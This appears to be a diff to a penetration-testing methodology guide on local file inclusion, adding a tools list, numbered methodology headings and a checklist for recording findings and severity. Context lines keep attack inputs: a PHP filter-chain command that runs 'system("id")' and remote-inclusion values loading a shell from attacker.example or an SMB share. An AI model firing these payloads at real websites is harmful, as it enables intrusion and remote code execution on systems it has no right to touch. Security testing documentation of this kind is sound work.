@@ -12,7 +12,15 @@ origin: AI Threat Hunting
 - Dynamic content loading based on user input, URL patterns like `/index.php?page=about`
 - Error messages reveal file system paths
 
-## LFI Detection
+## Tools
+
+- `curl` — manual path traversal probing and wrapper testing
+- `ffuf` — automated traversal depth and path fuzzing
+- `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool)
+
+## Methodology
+
+### 1. LFI Detection
 
 ### Basic Path Traversal
 ```
@@ -134,6 +142,15 @@ python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 ?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
 ?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
 ```
+
+## What to Record
+
+- Vulnerable parameter and endpoint
+- Traversal depth required (how many `../`)
+- Encoding/bypass technique needed (null byte, double encoding, etc.)
+- Files successfully read and their content (redact secrets in report)
+- RCE method if achieved (log poisoning, PHP wrappers, filter chains)
+- Severity: Critical (RCE), High (sensitive file read), Medium (limited file read)
 
 ## Extended Resources
 
